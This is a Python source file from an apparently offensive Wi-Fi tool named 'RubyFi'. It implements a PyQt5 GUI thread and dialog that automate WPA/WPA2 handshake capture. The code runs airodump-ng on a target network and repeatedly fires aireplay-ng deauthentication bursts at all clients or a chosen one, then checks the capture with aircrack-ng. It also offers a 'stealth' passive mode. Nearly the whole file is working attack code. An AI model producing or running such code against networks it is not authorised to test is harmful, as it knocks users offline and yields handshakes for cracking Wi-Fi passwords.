#!/usr/bin/env python3
"""
gui/handshake_dialog.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RubyFi  —  Handshake Capture background thread + mode dialog.

Drop this file into  gui/  then add to main_window.py:
    from gui.handshake_dialog import HandshakeCaptureThread, HandshakeModeDialog
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os
import time
import subprocess

from PyQt5.QtCore    import QThread, pyqtSignal, Qt
from PyQt5.QtWidgets import QDialog, QVBoxLayout, QPushButton, QLabel


# ═══════════════════════════════════════════════════════════════════
#  BACKGROUND THREAD
# ═══════════════════════════════════════════════════════════════════

class HandshakeCaptureThread(QThread):
    """
    Runs the full WPA/WPA2 handshake capture cycle in a background thread.

    Signals
    -------
    statusupdate(str)               log message
    phasechanged(str, str)          (label_text, hex_colour)
    statsupdate(int, int, float)    (elapsed_s, deauth_cycles, cap_file_kb)
    handshakefound(str)             absolute path to the .cap file
    attackcomplete(bool, str)       (success, message_or_filepath)
    """

    statusupdate   = pyqtSignal(str)
    phasechanged   = pyqtSignal(str, str)
    statsupdate    = pyqtSignal(int, int, float)
    handshakefound = pyqtSignal(str)
    attackcomplete = pyqtSignal(bool, str)

    TIMEOUT        = 300    # 5 minutes
    DEAUTH_ON_SEC  = 10     # seconds to fire deauth each cycle
    DEAUTH_WAIT    = 15     # seconds between cycles (includes reconnect window)

    def __init__(self, interface, bssid, ssid, channel,
                 mode="auto", client_mac=None):
        super().__init__()
        self.interface  = interface
        self.bssid      = bssid
        self.ssid       = ssid
        self.channel    = str(channel)
        self.mode       = mode           # "auto" | "manual" | "passive"
        self.client_mac = client_mac     # only meaningful for "manual"
        self.running    = True

        # ── build output path (mirrors CLI handshake.py) ────────
        import config
        safe_ssid  = "".join(
            c for c in ssid if c.isalnum() or c in "._- "
        )[:20].strip() or "HiddenSSID"
        safe_bssid = bssid.replace(":", "-")
        fname      = f"{safe_ssid}_{safe_bssid}_{int(time.time())}"

        self.output_prefix = str(config.HANDSHAKES_DIR / fname)
        self.cap_file      = f"{self.output_prefix}-01.cap"

        self._airodump_proc = None
        self._deauth_proc   = None
        self.deauth_cycles  = 0
        self.start_time     = None

    # ── tiny helpers ────────────────────────────────────────────────

    def _s(self, msg):
        self.statusupdate.emit(msg)

    def _phase(self, text, colour="#00b4d8"):
        self.phasechanged.emit(text, colour)

    def _emit_stats(self):
        elapsed = int(time.time() - (self.start_time or time.time()))
        kb      = (
            os.path.getsize(self.cap_file) / 1024
            if os.path.exists(self.cap_file) else 0.0
        )
        self.statsupdate.emit(elapsed, self.deauth_cycles, round(kb, 1))

    # ── core sub-routines ────────────────────────────────────────────

    def _validate(self):
        """Return True when the .cap contains a confirmed WPA handshake."""
        if not os.path.exists(self.cap_file):
            return False
        if os.path.getsize(self.cap_file) < 100:
            return False
        try:
            r = subprocess.run(
                ["aircrack-ng", "-w", "/dev/null", self.cap_file],
                capture_output=True, text=True, timeout=5
            )
            out = r.stdout + r.stderr
            return "1 handshake" in out or "WPA (1 handshake" in out
        except Exception:
            return False

    def _start_airodump(self):
        try:
            cmd = [
                "airodump-ng",
                "--bssid",         self.bssid,
                "--channel",       self.channel,
                "-w",              self.output_prefix,
                "--output-format", "cap",
                self.interface,
            ]
            self._airodump_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setpgrp,
            )
            return True
        except Exception as e:
            self._s(f"! airodump-ng failed to start: {e}")
            return False

    def _start_deauth(self):
        try:
            cmd = ["aireplay-ng", "--deauth", "0", "-a", self.bssid]
            if self.client_mac:
                cmd += ["-c", self.client_mac]
            cmd.append(self.interface)
            self._deauth_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception as e:
            self._s(f"! aireplay-ng failed to start: {e}")

    def _stop_deauth(self):
        if self._deauth_proc and self._deauth_proc.poll() is None:
            self._deauth_proc.terminate()
            try:
                self._deauth_proc.wait(timeout=2)
            except Exception:
                pass
        self._deauth_proc = None
        subprocess.run(["pkill", "-9", "aireplay-ng"], capture_output=True)

    # ── MAIN THREAD ENTRY ────────────────────────────────────────────

    def run(self):
        try:
            # ── PHASE 0 : lock channel ──────────────────────────
            self._phase("⚙  SETTING UP", "#00b4d8")
            self._s(f"Locking {self.interface} → channel {self.channel} …")
            subprocess.run(
                ["iwconfig", self.interface, "channel", self.channel],
                capture_output=True,
            )
            time.sleep(0.5)

            # ── PHASE 1 : start airodump-ng ─────────────────────
            self._s(f"Starting airodump-ng  |  BSSID {self.bssid}")
            if not self._start_airodump():
                self.attackcomplete.emit(False, "Failed to start airodump-ng")
                return

            # ── PHASE 2 : stabilisation countdown ───────────────
            self._phase("📡  STABILISING", "#ffbe0b")
            for i in range(5, 0, -1):
                if not self.running:
                    self.attackcomplete.emit(False, "Stopped by user")
                    return
                self._s(f"Stabilising capture engine … {i}s")
                time.sleep(1)

            if not self.running:
                self.attackcomplete.emit(False, "Stopped by user")
                return

            # ── PHASE 3 : capture loop ───────────────────────────
            self._phase("🎯  CAPTURING", "#ff006e")
            self._s(
                f"Capture ACTIVE  |  mode: {self.mode.upper()}"
                + (f"  |  client: {self.client_mac}" if self.client_mac else "  |  broadcast")
            )
            self.start_time   = time.time()
            deauth_active     = False
            last_deauth_t     = 0.0

            while self.running:
                elapsed    = time.time() - self.start_time
                time_since = time.time() - last_deauth_t

                # ── timeout? ─────────────────────────────────────
                if elapsed >= self.TIMEOUT:
                    self._phase("⏰  TIMEOUT", "#8b949e")
                    self._s(
                        f"5-minute timeout — {self.deauth_cycles} deauth cycles completed."
                    )
                    break

                # ── handshake already captured? ───────────────────
                if self._validate():
                    self._phase("✅  CAPTURED!", "#00ff88")
                    self._s("SUCCESS — WPA handshake captured and verified!")
                    self.handshakefound.emit(self.cap_file)
                    self.attackcomplete.emit(True, self.cap_file)
                    return

                # ── deauth logic (auto / manual) ──────────────────
                if self.mode in ("auto", "manual"):
                    if not deauth_active and time_since >= self.DEAUTH_WAIT:
                        self.deauth_cycles += 1
                        self._phase(
                            f"⚡  DEAUTHING  —  cycle {self.deauth_cycles}",
                            "#ff006e",
                        )
                        tgt = f"→ {self.client_mac}" if self.client_mac else "(broadcast)"
                        self._s(
                            f"[Cycle {self.deauth_cycles}] Deauth burst  {tgt}"
                        )
                        self._start_deauth()
                        deauth_active = True
                        last_deauth_t = time.time()

                    elif deauth_active and time_since >= self.DEAUTH_ON_SEC:
                        self._stop_deauth()
                        deauth_active = False
                        self._phase("🕐  WAITING — CLIENT RECONNECT", "#ffbe0b")
                        self._s(
                            "Deauth burst ended — waiting for client to reconnect …"
                        )
                else:
                    # passive: just show the phase once (quiet)
                    if not deauth_active:
                        self._phase("👁  PASSIVE LISTENING", "#00b4d8")
                        deauth_active = True      # flag re-used to avoid spam

                self._emit_stats()
                time.sleep(1)

            # ── fell out of loop without capturing ───────────────
            self.attackcomplete.emit(
                False,
                f"No handshake captured  |  {self.deauth_cycles} deauth cycle(s)  |  "
                f"{int(elapsed)}s elapsed",
            )

        except Exception as e:
            self.attackcomplete.emit(False, str(e))
        finally:
            self._cleanup()

    # ── cleanup ─────────────────────────────────────────────────────

    def _cleanup(self):
        self._stop_deauth()
        if self._airodump_proc:
            try:
                os.killpg(os.getpgid(self._airodump_proc.pid), 9)
            except Exception:
                try:
                    self._airodump_proc.terminate()
                except Exception:
                    pass
        subprocess.run(["pkill", "-9", "airodump-ng"], capture_output=True)
        subprocess.run(["pkill", "-9", "aireplay-ng"],  capture_output=True)

    def stop(self):
        self.running = False
        self._stop_deauth()


# ═══════════════════════════════════════════════════════════════════
#  MODE SELECTION DIALOG
# ═══════════════════════════════════════════════════════════════════

class HandshakeModeDialog(QDialog):
    """
    Lets the user choose a capture strategy before the attack starts.

    Attributes
    ----------
    selected_mode : str | None   "auto" | "manual" | "passive"
    """

    def __init__(self, target_ssid, target_bssid, target_channel,
                 interface, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Handshake Capture")
        self.setModal(True)
        self.setMinimumSize(540, 400)
        self.target_ssid    = target_ssid
        self.target_bssid   = target_bssid
        self.target_channel = target_channel
        self.interface      = interface
        self.selected_mode  = None
        self._init_ui()

    def _init_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(4)

        # ── header ──────────────────────────────────────────────
        header = QLabel("🤝  HANDSHAKE CAPTURE")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet(
            "font-size:18px; font-weight:bold; color:#ffbe0b; margin:14px;"
        )
        layout.addWidget(header)

        # ── target info strip ────────────────────────────────────
        info = QLabel(
            f"  Target  {self.target_ssid}    ·    "
            f"{self.target_bssid}    ·    Ch {self.target_channel}"
        )
        info.setStyleSheet(
            "color:#c9d1d9; margin:6px; padding:10px;"
            "background:#161b22; border-radius:6px; font-size:12px;"
        )
        layout.addWidget(info)

        # ── mode buttons ─────────────────────────────────────────
        MODES = [
            (
                "⚡  Auto-Repeat Deauth  (Recommended)",
                "auto",    "#ffbe0b",
                "Fully automatic — deauth burst every 15 s until handshake captured",
            ),
            (
                "🎯  Manual Deauth  (Select Client)",
                "manual",  "#ff006e",
                "Scan connected clients, send directed deauth to a chosen target",
            ),
            (
                "👁  Passive Listening  (Stealth)",
                "passive", "#00b4d8",
                "No deauth sent — silently waits for a natural 4-way handshake",
            ),
        ]

        for text, mode_id, colour, desc in MODES:
            btn = QPushButton(text)
            btn.setMinimumHeight(54)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background: #21262d;
                    border: 2px solid {colour};
                    color: {colour};
                    font-size: 13px;
                    font-weight: bold;
                    text-align: left;
                    padding-left: 22px;
                    border-radius: 6px;
                }}
                QPushButton:hover {{
                    background: {colour};
                    color: #0d1117;
                }}
            """)
            btn.clicked.connect(lambda _, m=mode_id: self._select(m))
            layout.addWidget(btn)

            desc_lbl = QLabel(desc)
            desc_lbl.setStyleSheet(
                "color:#8b949e; font-size:10px;"
                "margin-left:28px; margin-bottom:8px;"
            )
            layout.addWidget(desc_lbl)

        layout.addStretch()

        # ── cancel ───────────────────────────────────────────────
        cancel = QPushButton("Cancel")
        cancel.setStyleSheet("""
            QPushButton {
                background: #161b22; border: 2px solid #8b949e;
                color: #8b949e; padding: 10px; border-radius: 6px;
            }
            QPushButton:hover { background: #8b949e; color: #0d1117; }
        """)
        cancel.clicked.connect(self.reject)
        layout.addWidget(cancel)

    def _select(self, mode_id):
        self.selected_mode = mode_id
        self.accept()
